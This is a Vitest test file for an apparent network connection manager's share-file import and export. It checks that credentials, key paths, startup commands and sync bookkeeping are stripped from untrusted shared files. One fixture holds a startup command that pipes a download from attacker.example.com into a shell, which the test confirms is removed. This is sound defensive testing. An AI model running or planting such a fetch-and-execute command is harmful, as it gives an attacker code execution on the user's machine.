    expect(lastInfoMessage()).toMatch(/\(2 skipped\)/);
  });

  it("writes nothing to the vault (⊘ any secret, or any key for one, being stored)", async () => {
    const recipient = await makeMachine();

    await importShare(
      recipient,
      shareJson({
        inventorySources: [makeSource({ defaultUsername: "user" })],
        // A file cannot carry a secret section on a share, and one that tries is ignored.
        encryptedSecrets: { inventorySourceSecrets: { "src-1": { apiToken: "smuggled" } } }
      })
    );

    expect(recipient.core.getSnapshot().inventorySources).toHaveLength(1);
    expect(recipient.vault.keys()).toEqual([]);
  });

  it("never asks for a master password or checks a backup seal, even when a share file carries an encrypted section with one (⊘ the backup's readable-half seal gating the share path)", async () => {
    const recipient = await makeMachine();

    await importShare(
      recipient,
      shareJson({
        inventorySources: [makeSource({ defaultUsername: "user" })],
        encryptedSecrets: { kdf: "pbkdf2-sha512", iterations: 210_000, cipher: "aes-256-gcm", iv: "", salt: "", tag: "", ciphertext: "bm90LWEtcmVhbC1zZWFs" }
      })
    );

    // Landed — so no decrypt was attempted and no "changed after it was created" refusal fired.
    expect(recipient.core.getSnapshot().inventorySources).toHaveLength(1);
    expect(mockShowErrorMessage).not.toHaveBeenCalled();
    expect(mockShowInputBox).not.toHaveBeenCalled();
  });

  it("counts the device templates and saved filters that landed, and does not lead with \"0 profiles\" when only inventory records did (⊘ a message that reads as if nothing was imported)", async () => {
    const recipient = await makeMachine();

    await importShare(
      recipient,
      shareJson({
        deviceTemplates: [{ id: "tpl-1", name: "Core", fields: { multiplexing: { mode: "fill", value: true } } }],
        inventorySources: [makeSource({ defaultUsername: "user", templateRules: [{ id: "rule-1", templateId: "tpl-1" }] })],
        savedFilters: [
          { id: "sf-1", name: "Syd", filter: "site=syd" },
          { id: "sf-2", name: "Mel", filter: "site=mel" }
        ]
      })
    );

    expect(lastInfoMessage()).toMatch(/^Imported 1 inventory source, 1 device template and 2 saved filters\. The source arrives without credentials/);
    expect(lastInfoMessage()).not.toContain("0 profiles");

    await importShare(recipient, shareJson({ savedFilters: [{ id: "sf-4", name: "Per", filter: "site=per" }] }));
    expect(lastInfoMessage()).toBe("Imported 1 saved filter.");

    await importShare(
      recipient,
      shareJson({
        servers: [makeServer({ username: "user" })],
        inventorySources: [makeSource({ defaultUsername: "user" })],
        savedFilters: [{ id: "sf-3", name: "Bne", filter: "site=bne" }]
      })
    );
    expect(lastInfoMessage()).toMatch(/^Imported 1 profiles, 1 inventory source and 1 saved filter\. The source arrives without credentials/);
  });

  it("offers Edit Inventory Source, opening the one source it imported (⊘ describing the remedy in prose only)", async () => {
    const recipient = await makeMachine();
    mockShowInformationMessage.mockResolvedValueOnce("Edit Inventory Source");

    await importShare(recipient, shareJson({ inventorySources: [makeSource({ defaultUsername: "user" })] }));
    await vi.waitFor(() => expect(mockExecuteCommand).toHaveBeenCalled());

    const [source] = recipient.core.getSnapshot().inventorySources;
    expect(mockShowInformationMessage.mock.calls.at(-1)?.[1]).toBe("Edit Inventory Source");
    expect(mockExecuteCommand).toHaveBeenCalledWith("nexus.inventory.editSource", source.id);
  });

  it.each([
    [
      "only sources that use no saved credentials",
      [[]],
      "Imported 1 inventory source. The source uses no saved credentials — review it in Edit Inventory Source before syncing."
    ],
    [
      "only sources that use saved credentials",
      [["apiToken"], ["password"]],
      "Imported 2 inventory sources. Sources arrive without credentials — add yours in Edit Inventory Source before syncing."
    ],
    [
      "both kinds",
      [["apiToken"], [], []],
      "Imported 3 inventory sources. 1 of the 3 sources arrives without the credentials it uses — add yours in Edit Inventory Source before syncing, and review the other 2 there too."
    ]
  ] as const)(
    "asks for credentials only for a source that uses saved ones — %s (⊘ telling the recipient of an anonymous GNS3 2.2 source to add credentials it has none of)",
    async (_label, secretFieldIdsPerSource, expected) => {
      const recipient = await makeMachine();

      await importShare(
        recipient,
        shareJson({
          inventorySources: secretFieldIdsPerSource.map((secretFieldIds, i) =>
            makeSource({ id: `src-${i}`, providerId: GNS3_PROVIDER_ID, defaultUsername: "user", secretFieldIds: [...secretFieldIds], config: { baseUrl: "http://gns3.example.com:3080" } })
          )
        })
      );

      expect(lastInfoMessage()).toBe(expected);
    }
  );

  it("says nothing about adding credentials when no source it imported uses any (⊘ a remedy for a problem the recipient does not have)", async () => {
    const recipient = await makeMachine();

    await importShare(
      recipient,
      shareJson({ inventorySources: [makeSource({ providerId: GNS3_PROVIDER_ID, defaultUsername: "user", secretFieldIds: [], config: { baseUrl: "http://gns3.example.com:3080" } })] })
    );

    expect(lastInfoMessage()).not.toMatch(/without credentials|add yours/);
  });

  it("lets Edit Inventory Source ask which one when several arrived (⊘ opening an arbitrary one of them)", async () => {
    const recipient = await makeMachine();
    mockShowInformationMessage.mockResolvedValueOnce("Edit Inventory Source");

    await importShare(
      recipient,
      shareJson({ inventorySources: [makeSource({ id: "a", defaultUsername: "user" }), makeSource({ id: "b", defaultUsername: "user" })] })
    );
    await vi.waitFor(() => expect(mockExecuteCommand).toHaveBeenCalled());

    expect(mockExecuteCommand).toHaveBeenCalledWith("nexus.inventory.editSource", undefined);
  });
});

describe("share import — synced servers", () => {
  it("lets a later source with the same id land when the first one is rejected — the first VALID one wins (⊘ reserving the id for a source that never lands, which leaves the rows owned by nothing)", async () => {
    const recipient = await makeMachine();

    await importShare(
      recipient,
      shareJson({
        inventorySources: [
          { ...makeSource({ id: "src-1", name: "Rejected", defaultUsername: "user" }), prunePolicy: "sometimes" },
          makeSource({ id: "src-1", name: "Valid", defaultUsername: "user" })
        ],
        servers: [syncedRow({ username: "user" })]
      })
    );

    const snapshot = recipient.core.getSnapshot();
    expect(snapshot.inventorySources.map((s) => s.name)).toEqual(["Valid"]);
    expect(snapshot.servers[0].origin?.sourceId).toBe(snapshot.inventorySources[0].id);
  });

  it("lands only the first valid source of several sharing one id in the file, and attaches the cached rows to it (⊘ every source landing while the rows follow the last one, so the first one's first sync adds every device again)", async () => {
    const recipient = await makeMachine();

    await importShare(
      recipient,
      shareJson({
        inventorySources: [
          makeSource({ id: "src-1", name: "First", defaultUsername: "user" }),
          makeSource({ id: "src-1", name: "Second", defaultUsername: "user" })
        ],
        servers: [syncedRow({ username: "user" })]
      })
    );

    const snapshot = recipient.core.getSnapshot();
    expect(snapshot.inventorySources.map((s) => s.name)).toEqual(["First"]);
    expect(snapshot.servers[0].origin?.sourceId).toBe(snapshot.inventorySources[0].id);
    expect(lastInfoMessage()).toMatch(/\(1 skipped\)/);
  });

  it("re-points each origin at the source that landed (⊘ the origin keeping the file's source id, which leaves the row owned by nothing)", async () => {
    const recipient = await makeMachine();

    await importShare(
      recipient,
      shareJson({ inventorySources: [makeSource({ defaultUsername: "user" })], servers: [syncedRow({ username: "user" })] })
    );

    const snapshot = recipient.core.getSnapshot();
    expect(snapshot.servers[0].origin?.sourceId).toBe(snapshot.inventorySources[0].id);
    expect(snapshot.servers[0].origin?.externalId).toBe("device:1");
  });

  it("drops the origin of a server whose source was rejected or is absent, and skips an addressless one, counting it (⊘ a dangling origin or a bare placeholder persisting)", async () => {
    const recipient = await makeMachine();
    const placeholder = (id: string, sourceId: string, externalId: string) =>
      makeServer({ id, name: id, host: "", port: 0, username: "user", addressless: true, origin: { sourceId, externalId, syncedAt: 1 } });

    await importShare(
      recipient,
      shareJson({
        inventorySources: [{ ...makeSource({ id: "src-bad", defaultUsername: "user" }), prunePolicy: "sometimes" }],
        servers: [
          syncedRow({ id: "to-rejected", name: "Addressed, source rejected", username: "user", origin: { ...syncedRow().origin!, sourceId: "src-bad" } }),
          syncedRow({ id: "to-absent", name: "Addressed, source absent", username: "user", origin: { ...syncedRow().origin!, sourceId: "src-absent", externalId: "device:2" } }),
          placeholder("placeholder-rejected", "src-bad", "device:3"),
          placeholder("placeholder-absent", "src-absent", "device:4")
        ]
      })
    );

    const snapshot = recipient.core.getSnapshot();
    expect(snapshot.inventorySources).toHaveLength(0);
    expect(snapshot.servers.map((s) => s.name).sort()).toEqual(["Addressed, source absent", "Addressed, source rejected"]);
    for (const server of snapshot.servers) {
      expect(server.origin).toBeUndefined();
    }
    expect(snapshot.servers.some((s) => s.addressless)).toBe(false);
    // One rejected source + two skipped placeholders.
    expect(lastInfoMessage()).toBe("Imported 2 profiles (3 skipped).");
  });

  it("remaps the templated.proxy stamp with the proxy it describes, in a server AND a device template (⊘ the stamp keeping the file's jump-host id, which reads as a permanent hand edit)", async () => {
    const recipient = await makeMachine();
    const jump = { type: "ssh" as const, jumpHostId: "bastion-file-id" };

    await importShare(
      recipient,
      shareJson({
        inventorySources: [makeSource({ defaultUsername: "user", templateRules: [{ id: "rule-1", templateId: "tpl-1" }] })],
        deviceTemplates: [{ id: "tpl-1", name: "Via bastion", fields: { proxy: { mode: "override", value: jump } } }],
        servers: [
          makeServer({ id: "bastion-file-id", name: "Bastion", host: "10.0.0.254", username: "user" }),
          syncedRow({ username: "user", proxy: jump, origin: { ...syncedRow().origin!, templated: { proxy: jump } } })
        ]
      })
    );

    const snapshot = recipient.core.getSnapshot();
    const bastion = snapshot.servers.find((s) => s.name === "Bastion")!;
    const row = snapshot.servers.find((s) => s.origin !== undefined)!;
    expect(row.proxy).toEqual({ type: "ssh", jumpHostId: bastion.id });
    expect(row.origin?.templated?.proxy).toEqual(row.proxy);
    expect(snapshot.deviceTemplates[0].fields.proxy?.value).toEqual(row.proxy);
  });

  it("keeps a row's link to a key profile with no key file when the row's origin does not land — a server no source owns, which no sync unlinks (⊘ leaving the link out by its stamp alone)", async () => {
    const recipient = await makeMachine();

    await importShare(
      recipient,
      shareJson({
        authProfiles: [makeProfile({ id: "ap-key", name: "Lab key", username: "user", authType: "key" })],
        servers: [syncedRow({ username: "user", authProfileId: "ap-key", origin: { ...syncedRow().origin!, sourceId: "src-absent", syncedAuthProfileId: "ap-key" } })]
      })
    );

    const [server] = recipient.core.getSnapshot().servers;
    expect(server.origin).toBeUndefined();
    expect(server.authProfileId).toBe(recipient.core.getSnapshot().authProfiles[0].id);
  });

  it("strips the origin from a share that carries no sources — a hand-edited file, or one written before shares carried them — and drops its placeholders (⊘ a dangling origin landing)", async () => {
    const recipient = await makeMachine();

    await importShare(
      recipient,
      shareJson({
        servers: [
          syncedRow({ username: "user" }),
          makeServer({ id: "p", name: "Placeholder", host: "", port: 0, username: "user", addressless: true, origin: { sourceId: "src-1", externalId: "device:9", syncedAt: 1 } })
        ]
      })
    );

    const snapshot = recipient.core.getSnapshot();
    expect(snapshot.servers).toHaveLength(1);
    expect(snapshot.servers[0].origin).toBeUndefined();
    expect(lastInfoMessage()).toBe("Imported 1 profiles (1 skipped).");
  });

  it("imports a share file exactly as the previous release wrote it — no inventory keys, origin-less rows — unchanged (⊘ the new passes rejecting or altering an old file)", async () => {
    const recipient = await makeMachine();
    // As the previous release's exporter wrote them: what it clears is already absent or blank.
    const oldServer = makeServer({ id: "old-1", name: "Old Router", username: "user", authType: "key", keyPath: "" });
    const oldSerial = { id: "old-ser", name: "Console", path: "/dev/ttyUSB0", baudRate: 9600, dataBits: 8, stopBits: 1, parity: "none", rtscts: false };
    const oldShell = { id: "old-ls", name: "Build shell", launchMode: "custom", shellPath: "/bin/bash", shellArgs: ["-l"] };
    const oldShare = JSON.stringify({
      version: 2,
      exportType: "share",
      exportedAt: "2026-09-01T00:00:00.000Z",
      inventoryStatusPollPerSource: true,
      servers: [oldServer],
      tunnels: [],
      serialProfiles: [oldSerial],
      localShellProfiles: [oldShell],
      authProfiles: [makeProfile({ id: "ap-old", username: "user" })],
      groups: ["Lab"],
      macroFolders: [],
      settings: {}
    });

    await importShare(recipient, oldShare);

    const snapshot = recipient.core.getSnapshot();
    expect(snapshot.servers.map((s) => s.name)).toEqual(["Old Router"]);
    const { id: _serverId, ...serverFields } = snapshot.servers[0];
    expect(serverFields).toEqual((({ id: _id, ...rest }) => rest)(oldServer));
    const { id: _serialId, ...serialFields } = snapshot.serialProfiles[0];
    expect(serialFields).toEqual((({ id: _id, ...rest }) => rest)(oldSerial));
    const { id: _shellId, ...shellFields } = snapshot.localShellProfiles[0];
    expect(shellFields).toEqual((({ id: _id, ...rest }) => rest)(oldShell));
    expect(snapshot.inventorySources).toEqual([]);
    expect(lastInfoMessage()).toBe("Imported 4 profiles.");
    // No source landed, so no source wording and no button.
    expect(lastInfoMessage()).not.toContain("inventory source");
    expect(mockShowInformationMessage.mock.calls.at(-1)).toHaveLength(1);
  });

  it.each([
    ["stamped", true],
    ["unstamped (hand-edited)", undefined]
  ])(
    "discards the retired global poll interval on a %s share, even with an EVE-NG source in it (⊘ carrying it onto the imported source, which starts unattended polling nobody on this machine chose)",
    async (_label, stamp) => {
      const recipient = await makeMachine();

      await importShare(
        recipient,
        shareJson({
          inventoryStatusPollPerSource: stamp,
          inventorySources: [makeSource({ providerId: EVE_NG_PROVIDER_ID, defaultUsername: "user", secretFieldIds: ["password"], config: { baseUrl: "https://eve.example.com" } })],
          settings: { "nexus.inventory.statusPollSeconds": 45 }
        })
      );

      const [source] = recipient.core.getSnapshot().inventorySources;
      expect(source.config).not.toHaveProperty("statusPollSeconds");
      expect(mockConfigUpdate).not.toHaveBeenCalledWith("nexus.inventory", "statusPollSeconds", expect.anything());
    }
  );
});

// ---------------------------------------------------------------------------
// The round trip: a real sync, the real commands, the recipient's first sync
// ---------------------------------------------------------------------------

/**
 * What `sanitizeForSharing` clears from the records a share carries whole —
 * servers, serial and Local Shell profiles, settings — the import clears again
 * before validation, with the same scrub: a share file is untrusted, and a
 * hand-edited or older one can carry anything the export clears.
 */
describe("share import — what the export clears, cleared again", () => {
  it("lands a server with no key path and the username \"user\", whatever the file says (⊘ a key-auth server arriving set to read a private key at the sender's path on this machine)", async () => {
    const recipient = await makeMachine();

    await importShare(
      recipient,
      shareJson({ servers: [makeServer({ id: "manual", name: "Manual", username: "bob", authType: "key", keyPath: "/home/bob/.ssh/id_rsa" })] })
    );

    const [server] = recipient.core.getSnapshot().servers;
    expect(server).toMatchObject({ name: "Manual", authType: "key", keyPath: "", username: "user" });
    expect(JSON.stringify(recipient.core.getSnapshot())).not.toMatch(/id_rsa|bob/);
  });

  it("lands a Local Shell profile with no working directory, startup command or environment (⊘ a file's startup command running on this machine the first time the profile opens)", async () => {
    const recipient = await makeMachine();

    await importShare(
      recipient,
      shareJson({
        localShellProfiles: [
          {
            id: "ls-1",
            name: "Build shell",
            launchMode: "custom",
            shellPath: "/bin/bash",
            cwd: "/home/bob/secret-project",
            startupCommand: "curl https://attacker.example.com/x | sh",
            env: { API_TOKEN: "FILE-TOKEN" }
          }
        ]
      })
    );

    const [profile] = recipient.core.getSnapshot().localShellProfiles;
    expect(profile).toMatchObject({ name: "Build shell", launchMode: "custom", shellPath: "/bin/bash" });
    for (const key of ["cwd", "startupCommand", "env"]) {
      expect(profile).not.toHaveProperty(key);
    }
  });

  it("lands a serial profile without the learned device hint (⊘ the sender's adapter identity steering which port this machine's Smart Follow picks)", async () => {
    const recipient = await makeMachine();

    await importShare(
      recipient,
      shareJson({
        serialProfiles: [
          {
            id: "ser-1",
            name: "Console",
            path: "/dev/ttyUSB0",
            baudRate: 9600,
            dataBits: 8,
            stopBits: 1,
            parity: "none",
            rtscts: false,
            deviceHint: { vendorId: "0403", productId: "6001", serialNumber: "SENDER-ADAPTER" }
          }
        ]
      })
    );

    const [profile] = recipient.core.getSnapshot().serialProfiles;
    expect(profile).toMatchObject({ name: "Console", path: "/dev/ttyUSB0", baudRate: 9600 });
    expect(profile).not.toHaveProperty("deviceHint");
  });

  it("never writes the file's session log directory (⊘ a hand-edited file pointing this machine's session transcripts at a folder of its choosing)", async () => {
    const recipient = await makeMachine();

    await importShare(recipient, shareJson({ settings: { "nexus.logging.sessionLogDirectory": "/tmp/collected-transcripts" } }));

    expect(JSON.stringify(mockConfigUpdate.mock.calls)).not.toContain("/tmp/collected-transcripts");
  });
});

describe("share round trip — the recipient's first sync adopts the cached tree", () => {
  const SENDER_TOKEN = "SENDER-API-TOKEN-VALUE";
  /**
   * The key the REAL NetBox provider derives from a source's own config, on each
   * machine — so the URL rewriting the share does (userinfo removed, `href`
   * normalisation) is exercised, not assumed: a key that shifted would make
   * every cached row an update.
   */
  const netbox = createBuiltInProviders().find((provider) => provider.id === "netbox")!;
  const instanceKeyOf = (source: InventorySourceConfig): string | undefined => netbox.instanceKey!(source.config);
  const device = (n: number, endpoints: InventoryDevice["endpoints"]): InventoryDevice => ({
    externalId: `device:${n}`,
    name: `node-${n}`,
    endpoints
  });
  const DEVICES: InventoryDevice[] = [
    device(1, [{ kind: "ssh", host: "10.0.0.1" }]),
    device(2, [{ kind: "ssh", host: "10.0.0.2", port: 2222 }]),
    // No endpoint at all: a placeholder, `addressless: true, host: ""`.
    device(3, [])
  ];
  const tree = (devices: InventoryDevice[] = DEVICES): InventoryTree => ({ contractVersion: 1, devices });

  function planOn(machine: Machine, sourceId: string, devices: InventoryDevice[] = DEVICES): InventorySyncPlan {
    const snapshot = machine.core.getSnapshot();
    const source = snapshot.inventorySources.find((s) => s.id === sourceId)!;
    return computeSyncPlan({
      source,
      tree: tree(devices),
      currentServers: snapshot.servers,
      now: 1_800_000_000_000,
      providerInstanceKey: instanceKeyOf(source),
      authProfile: snapshot.authProfiles.find((p) => p.id === source.authProfileId),
      templatesById: new Map(snapshot.deviceTemplates.map((t) => [t.id, t])),
      authProfilesById: new Map(snapshot.authProfiles.map((p) => [p.id, p]))
    });
  }

  /**
   * A sender whose tree was written by a REAL sync: a NetBox source with a
   * trust stamp, a saved token, a sender login in its URL, insecure TLS on,
   * Removed-Device Policy `prunePolicy`, and a catch-all template routing every
   * device through a hand-made bastion — so the rows carry `templated` stamps
   * and a jump-host proxy as well as the usual address and username stamps.
   */
  /** An SSH auth profile the sender's sync links onto the cached rows — through the source's own link, or a device template's. */
  interface SenderAuth {
    profile: AuthProfile;
    via: "source" | "template";
  }

  async function makeSender(prunePolicy: InventorySourceConfig["prunePolicy"] = "orphan", auth?: SenderAuth): Promise<Machine> {
    const sender = await makeMachine();
    const { core } = sender;
    await core.addOrUpdateServer(makeServer({ id: "bastion-1", name: "Bastion", host: "10.0.0.254", authType: "password" }));
    if (auth !== undefined) {
      await core.addOrUpdateAuthProfile(auth.profile);
    }
    await core.addOrUpdateDeviceTemplate({
      id: "tpl-1",
      name: "Via bastion",
      fields: {
        proxy: { mode: "override", value: { type: "ssh", jumpHostId: "bastion-1" } },
        multiplexing: { mode: "override", value: true },
        ...(auth?.via === "template" ? { authProfileId: { mode: "override" as const, value: auth.profile.id } } : {})
      }
    });
    await core.addOrUpdateSavedFilter({ id: "sf-1", name: "Syd", filter: "site=syd" });
    await core.addOrUpdateInventorySource(
      makeSource({
        prunePolicy,
        config: { baseUrl: "https://netops:tok3n@netbox.example.com/netbox/", allowInsecureTls: true, filter: "site=syd" },
        providerFingerprint: "fp-sender",
        templateRules: [{ id: "rule-1", templateId: "tpl-1" }],
        ...(auth?.via === "source" ? { authProfileId: auth.profile.id } : {})
      })
    );
    await sender.vault.store(inventorySecretKey("src-1", "apiToken"), SENDER_TOKEN);

    const plan = planOn(sender, "src-1");
    expect(plan.adds).toHaveLength(3);
    await core.applyInventorySyncPlan(planToApplication(plan, core.getInventorySource("src-1")!));
    if (auth !== undefined) {
      // Premise: the sync linked the profile to every row it added, the placeholder included, and stamped it.
      const linked = core.getSnapshot().servers.filter((s) => s.authProfileId === auth.profile.id && s.origin?.syncedAuthProfileId === auth.profile.id);
      expect(linked.map((s) => s.origin?.externalId).sort()).toEqual(["device:1", "device:2", "device:3"]);
    }

    // Premise: the sender's state really does hold everything the share must not carry.
    const source = core.getInventorySource("src-1")!;
    expect(source.lastSyncAt).toBeDefined();
    expect(source.managedFolders).toBeDefined();
    expect(core.getSnapshot().servers.filter((s) => s.origin?.sourceId === "src-1")).toHaveLength(3);
    expect(core.getSnapshot().servers.find((s) => s.addressless)?.origin?.syncedUsername).toBe("netops");
    return sender;
  }

  async function roundTrip(prunePolicy?: InventorySourceConfig["prunePolicy"], auth?: SenderAuth): Promise<{ recipient: Machine; json: string; sourceId: string }> {
    const sender = await makeSender(prunePolicy, auth);
    const json = await exportShare(sender);
    const recipient = await makeMachine();
    await importShare(recipient, json);
    const sources = recipient.core.getSnapshot().inventorySources;
    expect(sources).toHaveLength(1);
    return { recipient, json, sourceId: sources[0].id };
  }

  it("THE LOAD-BEARING ONE — the recipient's first sync against the unchanged source adds nothing, prunes nothing, adopts nothing and changes nothing (⊘ any origin that does not make the cached rows OWNED — stripped, left on the sender's source id, or a stamp out of lockstep)", async () => {
    const { recipient, sourceId } = await roundTrip();

    const snapshot = recipient.core.getSnapshot();
    // Premise: the cache landed, placeholder included, owned by the imported
    // source — and so did the template its rule names and the saved filter.
    expect(snapshot.servers.filter((s) => s.origin?.sourceId === sourceId)).toHaveLength(3);
    expect(snapshot.servers.find((s) => s.addressless)).toMatchObject({ host: "", port: 0 });
    expect(snapshot.inventorySources[0].templateRules).toEqual([{ id: "rule-1", templateId: snapshot.deviceTemplates[0].id }]);
    expect(snapshot.savedFilters.map((f) => [f.name, f.filter])).toEqual([["Syd", "site=syd"]]);

    // The two machines' sources name the same deployment, derived by the provider
    // itself from two differently-written base URLs.
    expect(instanceKeyOf(snapshot.inventorySources[0])).toBe("https://netbox.example.com/netbox");
    expect(snapshot.servers.find((s) => s.origin?.externalId === "device:1")?.origin?.syncedInstanceKey).toBe("https://netbox.example.com/netbox");

    const plan = planOn(recipient, sourceId);

    expect(plan.adds).toEqual([]);
    expect(plan.prunes).toEqual([]);
    expect(plan.adoptionCandidates).toEqual([]);
    expect(plan.updates).toEqual([]);
    expect(plan.unchangedCount).toBe(3);
    expect(plan.manualDuplicateCount).toBe(0);
  });

  it("carries no secret, trust stamp, sync bookkeeping, sender login or insecure-TLS opt-in in the file the real command writes (⊘ any of them surviving the export)", async () => {
    const sender = await makeSender();

    const json = await exportShare(sender);
    const file = JSON.parse(json);

    expect(json).not.toContain(SENDER_TOKEN);
    expect(json).not.toContain("tok3n");
    expect(json).not.toContain("fp-sender");
    // A share has no encrypted section, so nothing to seal the readable half with.
    expect(file).not.toHaveProperty("encryptedSecrets");
    expect(json).not.toContain("clearPartSeal");
    // The sender's login was the source's defaultUsername, every row's username
    // and syncedUsername, and the userinfo in the base URL.
    expect(json).not.toContain("netops");
    const [source] = file.inventorySources;
    for (const key of ["providerFingerprint", "revision", "managedFolders", "lastSyncAt"]) {
      expect(source).not.toHaveProperty(key);
    }
    expect(source).toMatchObject({ defaultUsername: "user", config: { baseUrl: "https://netbox.example.com/netbox/", allowInsecureTls: false, filter: "site=syd" } });
    expect(file.deviceTemplates).toHaveLength(1);
    expect(file.savedFilters).toEqual([{ id: expect.any(String), name: "Syd", filter: "site=syd" }]);
    // Bastion + three synced rows.
    expect(lastInfoMessage()).toBe("Exported 4 profiles and 1 inventory source (without credentials) for sharing to /fake/nexus-shared.json.");
  });

  it("leaves a device template no source uses out of the file the real command writes, with the profile only it links — and the recipient's first sync still changes nothing (⊘ exporting every template in the library)", async () => {
    const sender = await makeSender();
    await sender.core.addOrUpdateAuthProfile(makeProfile({ id: "ap-unused", name: "Unrelated login" }));
    await sender.core.addOrUpdateDeviceTemplate({
      id: "tpl-unused",
      name: "Unrelated template",
      fields: {
        proxy: { mode: "override", value: { type: "socks5", host: "unrelated-proxy.example.com", port: 1080 } },
        authProfileId: { mode: "fill", value: "ap-unused" }
      }
    });

    const json = await exportShare(sender);

    const file = JSON.parse(json);
    expect(file.deviceTemplates.map((t: DeviceTemplateProfile) => t.name)).toEqual(["Via bastion"]);
    expect(file).not.toHaveProperty("authProfiles");
    expect(json).not.toMatch(/Unrelated|unrelated-proxy/);

    const recipient = await makeMachine();
    await importShare(recipient, json);
    const sourceId = recipient.core.getSnapshot().inventorySources[0].id;
    const plan = planOn(recipient, sourceId);
    expect(plan.adds).toEqual([]);
    expect(plan.updates).toEqual([]);
    expect(plan.prunes).toEqual([]);
    expect(plan.unchangedCount).toBe(3);
  });

  it("counts the profiles it WROTE — a placeholder left out of the file is not in the total (⊘ counting the snapshot)", async () => {
    const sender = await makeSender();
    // A placeholder whose source is gone here: it cannot travel.
    await sender.core.addOrUpdateServer(
      makeServer({ id: "stray", name: "Stray placeholder", host: "", port: 0, addressless: true, origin: { sourceId: "src-removed", externalId: "x", syncedAt: 1 } })
    );

    const file = JSON.parse(await exportShare(sender));

    expect(file.servers.map((s: ServerConfig) => s.name)).not.toContain("Stray placeholder");
    expect(lastInfoMessage()).toMatch(/^Exported 4 profiles and 1 inventory source/);
  });

  it("orphans instead of deleting when the recipient's first sync no longer sees a device, if the sender's policy was Delete (⊘ importing `delete` verbatim)", async () => {
    const { recipient, sourceId } = await roundTrip("delete");

    const plan = planOn(recipient, sourceId, DEVICES.filter((d) => d.externalId !== "device:2"));

    expect(plan.adds).toEqual([]);
    expect(plan.prunes.map((p) => [p.policy, p.server.origin?.externalId])).toEqual([["orphan", "device:2"]]);
  });

  it("retro-applies an auth profile the recipient links on the source to every addressed cached row (⊘ `syncedUsername` left as the sender's, or a blank keyPath counted as the server's own key)", async () => {
    const { recipient, sourceId } = await roundTrip();
    const { core } = recipient;
    await core.addOrUpdateAuthProfile(makeProfile({ id: "ap-recipient", name: "Mine", username: "alice" }));
    // What the Edit Source form does: link the profile, mirror its username into the default.
    await core.addOrUpdateInventorySource({ ...core.getInventorySource(sourceId)!, authProfileId: "ap-recipient", defaultUsername: "alice" });

    const plan = planOn(recipient, sourceId);

    const linked = plan.updates.filter((u) => u.after.authProfileId === "ap-recipient").map((u) => u.after.origin?.externalId);
    expect(linked.sort()).toEqual(["device:1", "device:2"]);
    expect(plan.adds).toEqual([]);
  });

  /**
   * A KEY profile the sender's sync linked. The share strips its key file, as it
   * strips every key path — so on the recipient it is a key profile with no key
   * file, which the engine treats as unusable: a sync-made link to it is rolled
   * back (AUTH 2b), and the source or a template naming it draws a warning. The
   * share therefore leaves out exactly those links, each with its stamp.
   */
  const KEY_PROFILE = makeProfile({ id: "ap-key", name: "Lab key", authType: "key", keyPath: "/home/netops/.ssh/id_ed25519" });

  it.each([
    ["the source", "source"],
    ["a device template", "template"]
  ] as const)(
    "a key profile linked through %s arrives without its key file and without the links the sync made to it, stamps included — so the recipient's first sync still changes nothing (⊘ shipping those links, which the engine's keyless-key rollback undoes on every cached row at the first sync)",
    async (_label, via) => {
      const { recipient, sourceId } = await roundTrip(undefined, { profile: KEY_PROFILE, via });

      const plan = planOn(recipient, sourceId);

      expect(plan.updates).toEqual([]);
      expect(plan.adds).toEqual([]);
      expect(plan.prunes).toEqual([]);
      expect(plan.adoptionCandidates).toEqual([]);
      expect(plan.unchangedCount).toBe(3);
      expect(plan.warnings.join("\n")).not.toContain("has no key file");

      const snapshot = recipient.core.getSnapshot();
      // The profile itself still travels — the recipient's starting point — as a key profile with no key file.
      const shipped = snapshot.authProfiles.find((p) => p.name === "Lab key")!;
      expect(shipped).toMatchObject({ authType: "key", username: "user" });
      expect(shipped.keyPath).toBeUndefined();
      // Nothing the engine reads links it — neither the source, the template, nor any cached row,
      // whose stamp goes with the link so the row reads as never linked, not as hand-edited.
      expect(snapshot.inventorySources[0].authProfileId).toBeUndefined();
      expect(snapshot.deviceTemplates[0].fields.authProfileId).toBeUndefined();
      for (const row of snapshot.servers.filter((s) => s.origin?.sourceId === sourceId)) {
        expect(row.authProfileId).toBeUndefined();
        expect(row.origin?.syncedAuthProfileId).toBeUndefined();
      }
    }
  );

  it("once the recipient gives that key profile a key file of their own and links it on the source, the next sync links it to every addressed cached row (⊘ dropping the link but keeping its stamp, which reads as a per-server opt-out; ⊘ keeping the link without its stamp, which reads as a hand link)", async () => {
    const { recipient, sourceId } = await roundTrip(undefined, { profile: KEY_PROFILE, via: "source" });
    const { core } = recipient;
    const shipped = core.getSnapshot().authProfiles.find((p) => p.name === "Lab key")!;
    await core.addOrUpdateAuthProfile({ ...shipped, username: "alice", keyPath: "/home/alice/.ssh/id_ed25519" });
    // What the Edit Source form does: link the profile, mirror its username into the default.
    await core.addOrUpdateInventorySource({ ...core.getInventorySource(sourceId)!, authProfileId: shipped.id, defaultUsername: "alice" });

    const plan = planOn(recipient, sourceId);

    const linked = plan.updates
      .filter((u) => u.after.authProfileId === shipped.id && u.after.origin?.syncedAuthProfileId === shipped.id)
      .map((u) => u.after.origin?.externalId);
    expect(linked.sort()).toEqual(["device:1", "device:2"]);
    expect(plan.adds).toEqual([]);
  });

  it("a password profile linked through the source keeps its links and stamps, and with no saved password the recipient's first sync still changes nothing (⊘ dropping the sync's links to every profile, not only to a key profile the share leaves without a key file)", async () => {
    const { recipient, sourceId } = await roundTrip(undefined, { profile: makeProfile({ id: "ap-pw", name: "Lab password" }), via: "source" });

    const plan = planOn(recipient, sourceId);

    expect(plan.updates).toEqual([]);
    expect(plan.unchangedCount).toBe(3);
    const snapshot = recipient.core.getSnapshot();
    const shipped = snapshot.authProfiles.find((p) => p.name === "Lab password")!;
    expect(snapshot.inventorySources[0].authProfileId).toBe(shipped.id);
    const linked = snapshot.servers.filter((s) => s.authProfileId === shipped.id && s.origin?.syncedAuthProfileId === shipped.id);
    expect(linked.map((s) => s.origin?.externalId).sort()).toEqual(["device:1", "device:2", "device:3"]);
    expect(recipient.vault.keys()).toEqual([]);
  });

  it.each([
    ["with no key file", undefined],
    ["with a key file, which the import drops as the export does", "/home/alice/.ssh/id_ed25519"]
  ] as const)(
    "importing a hand-edited file whose linked profile was turned into a key profile %s lands it without the links the sync made to it, stamps included — so the first sync changes nothing (⊘ applying the rule on export only, so a hand-edited file puts back a link the engine rolls back; ⊘ the import keeping a key path the file carries)",
    async (_label, keyPath) => {
      const sender = await makeSender(undefined, { profile: makeProfile({ id: "ap-pw", name: "Lab login" }), via: "source" });
